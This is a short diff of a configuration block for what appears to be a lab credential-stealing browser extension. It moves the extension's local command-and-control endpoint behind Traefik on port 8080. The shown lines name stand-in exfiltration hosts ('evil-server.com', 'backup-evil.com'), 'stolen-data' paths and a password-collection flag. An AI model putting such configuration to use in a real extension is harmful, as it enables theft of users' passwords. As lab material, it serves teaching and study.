@@ -33,9 +33,9 @@
     collectUrl: 'https://evil-server.com/collect',
     fallbackUrl: 'http://backup-evil.com/data',
 
-    // Local development server
-    devUrl: 'http://localhost:9006/stolen-data',
-    healthUrl: 'http://localhost:9006/health',
+    // Local development server (shared-c2 via Traefik on port 8080)
+    devUrl: 'http://localhost:8080/lab3/extension/stolen-data',
+    healthUrl: 'http://localhost:8080/lab3/extension/health',
 
     // Data collection settings
     collectPasswords: true,
